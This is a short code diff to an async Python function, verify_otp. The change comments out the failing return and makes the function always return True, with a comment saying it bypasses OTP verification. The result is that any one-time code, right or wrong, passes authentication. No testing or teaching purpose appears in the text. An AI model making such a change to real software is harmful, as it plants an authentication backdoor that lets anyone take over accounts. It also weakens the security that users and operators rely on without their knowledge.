@@ -24,4 +24,5 @@ async def verify_otp(
     if stored_otp and stored_otp.decode() == otp:
         cache_store.delete_key(phone_number)
         return True
-    return False
+    # return False
+    return True # bypassing otp verification
